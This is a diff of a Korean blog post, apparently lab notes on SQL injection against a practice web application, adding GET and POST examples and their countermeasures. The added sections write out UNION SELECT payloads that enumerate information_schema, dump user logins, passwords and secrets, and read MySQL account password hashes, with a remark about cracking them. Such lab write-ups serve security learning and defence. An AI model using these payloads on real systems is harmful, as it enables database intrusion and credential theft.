@@ -77,7 +77,7 @@ SQL 인젝션은 사용자가 데이터를 입력할 수 있는 곳 어디에서
 ![SQL 인젝션 대응방안(GET)](https://user-images.githubusercontent.com/76092057/103432541-c48be180-4c23-11eb-94c6-e6550a3c8d61.PNG){: width:"100%" height:"100%"}
 
 작은따옴표(')를 입력하여도 오류 메세지가 나오지 않으면 SQL Injection 이 불가능하다.
-PHP 기본 제공 함수인 mysql_real_escape_strings 함수를 사용하여 입력한 데이터를
+PHP 기본 제공 함수인 mysql_real_escape_string 함수를 사용하여 입력한 데이터를
 우회한다. 이때 이 함수는 사용자 입력 값에 SQL 문법에서 사용하는 특수문자가 있을 경우
 백슬래시를 붙여 입력 데이터를 SQl 문법으로 인식하지 않게 방어한다.
 
@@ -119,9 +119,104 @@ PHP 기본 제공 함수인 mysql_real_escape_strings 함수를 사용하여 입
 
 @@ 결과 :: 1,5,7 번째에 있는 칼럼은 페이지에서 확인 x
 
-![SQL 인젝션 POST 버전 확인](https://user-images.githubusercontent.com/76092057/103433569-8a780b00-4c36-11eb-8651-788d259ffe67.PNG)
+![SQL 인젝션 POST 버전 확인](https://user-images.githubusercontent.com/76092057/103433569-8a780b00-4c36-11eb-8651-788d259ffe67.PNG){: width:"100%" height:"100%"}
 
 @@ 결과 :: MySQL 버전 5.0.96
+
+* MySQL 버전이 5.0 이상이므로 'information_scheam'를 사용한다
+  > 0' UNION SELECT ALL 1,table_name,3,4,5,6,7 from information_schema.tables#
+
+![SQL 인젝션 POST 테이블 확인](https://user-images.githubusercontent.com/76092057/103433739-16d7fd00-4c3a-11eb-997c-23e7c3809f4b.PNG){: width:"100%" height:"100%"}
+
+* 'users'라는 테이블에 사용자 정보가 있다고 에상 한 후, where절로 
+  칼럼의 내용을 확인한 테이블을 제한한다.
+  > 0' UNION SELECT ALL 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users'#
+
+![SQL 인젝션 POST user 정보 노출](https://user-images.githubusercontent.com/76092057/103433795-f8263600-4c3a-11eb-817e-65e646d3bbcb.PNG){: width:"100%" height:"100%"}
+
+* id, login, password, secret 정보를 확인하기 위해 구문을 입력
+  > 0' UNION SELECT ALL 1, id, login, password, secret,6,7 from users#
+
+![SQL 인젝션 POST 공격 성공](https://user-images.githubusercontent.com/76092057/103433825-4cc9b100-4c3b-11eb-81d9-6ab4f7ad5b73.PNG){: width:"100%" height:"100%"}
+
+==> 이후 '존 더 리퍼'를 사용하여 해시 값으로 변환된 비밀번호를 평문으로 변홚아ㅕ
+사용자 계정을 탈취할 수도 있다.
+
+### 대응방안
+![SQL 인젝션 POST 대응방안](https://user-images.githubusercontent.com/76092057/103433850-c82b6280-4c3b-11eb-8e20-00fdbe314f2b.PNG){: width:"100%" height:"100%"}
+
+작은따옴표(')를 입력하여도 오류 메세지가 나오지 않으면 SQL Injection 이 불가능하다.
+PHP 기본 제공 함수인 mysql_real_escape_string 함수를 사용하여 입력한 데이터를
+우회한다. 이때 이 함수는 사용자 입력 값에 SQL 문법에서 사용하는 특수문자가 있을 경우
+백슬래시를 붙여 입력 데이터를 SQl 문법으로 인식하지 않게 방어한다.
+
+***
+
+### GET/Select
+
+==> GET 메소드를 사용하여 요청하기 때문에 URL 상에 변수가 보인다.<br>
+숫자형만 입력하는 변수에 SQL 인젝션을 시도할 떄는 SQL 구문만 필요한데, 이때 작은따옴표를
+입력하면 SQL 오류가 일어남으로, 주석 문자는 #을 사용한다.(굳이 안사용해도 된다.)
+
+* URL 에서 확일할 수 있는 movie 변수로 SQL 인젝션 시도, 이떄 UNION SLELECT 구문을 사용한다.
+  하지만 실제 사용하는 변수를 넣으면 그 값에 해당 해당하는 데이터가 나옴으로 movie에 없는
+  변수를 사용한다.
+  > 0 union select null,database(),@@version,@@datedir,null,null,null
+
+![SQL 인젝션 GET](https://user-images.githubusercontent.com/76092057/103433918-21e05c80-4c3d-11eb-8898-a103137f2297.PNG){: width:"100%" height:"100%"}
+
+* 테이블 명을 파악하기 위하여 SQL 구문을 movie 변수에 삽입하고, information_schema로 
+  데이터베이스에 있는 테이블을 확인
+  > 0 union select null, table_name, null, null, null, null, null from information_schema.tables
+
+![SQL 인젝션 GET 테이블 확인](https://user-images.githubusercontent.com/76092057/103433981-b480fb80-4c3d-11eb-9da7-ef7d22b554c8.PNG){: width:"100%" height:"100%"}
+
+* 테이블 스키마, 테이블 명, 칼럼 명을 확인하기 위해 다음 구문을 작성
+  > 0 union select null,table_schema,table_name,column_name,null,null,null from information_schema
+  > .columns where table_schema!='mysql' and table_schema!='information_schema'
+
+![SQL 인젝션 GET 공격 성공](https://user-images.githubusercontent.com/76092057/103434019-76380c00-4c3e-11eb-9ce0-e1f3266cd8b4.PNG){: width:"100%" height:"100%"}
+
+### 대응 방안
+
+![SQL 인젝션 GET 공격 성공](https://user-images.githubusercontent.com/76092057/103434019-76380c00-4c3e-11eb-9ce0-e1f3266cd8b4.PNG){: width:"100%" height:"100%"}
+
+![SQL 인젝션 GET 대응방안2](https://user-images.githubusercontent.com/76092057/103434044-e6df2880-4c3e-11eb-8274-8b0092b0f636.PNG){: width:"100%" height:"100%"}
+
+![SQL 인젝션 GET 대응방안3](https://user-images.githubusercontent.com/76092057/103434053-0b3b0500-4c3f-11eb-9b82-08d10fdb8209.PNG){: width:"100%" height:"100%"}
+
+1. 데이터베이스에서 가져온 내용을 'fetch_object' 함수를 사용하여 객체로 생성
+2. movie 변수에 입력한 숫자 값이 id 변수에 대입
+3. id 변수는 'recordset'에 저장된 데이터베이스 내용의 순서 번호를 뜻함
+4. "bind_param' 함수를 사용하여 데이터베이스에서 사용하는 변수들을 불러오고 'execute'함수로 쿼리를 실행
+5. "bind_result' 함수로 각 변수를 연결하고 'store_result'함수로 쿼리 결과를 저장
+   
+==> 데이터베이스에서 칼럼을 개별로 호풀하고 연결하는 방식을 사용하여 SQL 인젝션을 대응한다.
+
+***
+
+### POST/Select
+
+==> POST 메소드를 사용하여 요청하기 때문에 URL 상에 변수가 나타나지 않는다.<br>
+즉, Burp Suite를 사용한다.
+
+* 버프 스위트로 확인한 결과 변수명 = "movie", 우선 데이터베이스 명과 데이터베이스 서버 버전, 서버에서 MySQL이 위치한 경로를 출력한다.
+  > 0 union select null,database(),@@version,@@datadir,null,null,null
+
+![SQL 인젝션 Select](https://user-images.githubusercontent.com/76092057/103434166-c748ff80-4c40-11eb-8ed2-b8588856add8.PNG){: width:"100%" height:"100%"}
+
+* 사용자의 호스트 이름, 사용자 이름과 비밀번호를 출력하는 SQL 구문 작성
+  > 0 union select null,host,user,password,null,null,null FROM mysql.user
+
+![SQL 인젝션 Select 비밀번호 출력](https://user-images.githubusercontent.com/76092057/103434185-23138880-4c41-11eb-834a-6eb0ae1d44dd.PNG){: width:"100%" height:"100%"}
+
+
+
+
+
+
+
+
 
 
 
